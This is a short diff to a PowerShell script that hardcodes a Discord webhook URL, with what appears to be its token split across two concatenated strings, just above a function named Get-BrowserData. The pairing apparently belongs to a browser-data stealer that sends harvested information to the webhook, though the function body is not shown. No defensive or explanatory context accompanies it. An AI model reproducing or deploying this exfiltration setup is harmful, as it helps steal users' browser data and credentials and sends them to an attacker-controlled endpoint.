@@ -1,6 +1,4 @@
-Param(
-    [string]$WebHook = "Path/to/file"
-)
+$WebHook = "https://discord.com/api/webhooks/1061037724158656623/" + "o01hWxoWfHLb-TZg6wdZQzRBozVziu6C90r0Hk4B2o_pG2p25cnSNjJAXJwL4symR6YD"
 
 function Get-BrowserData {
 
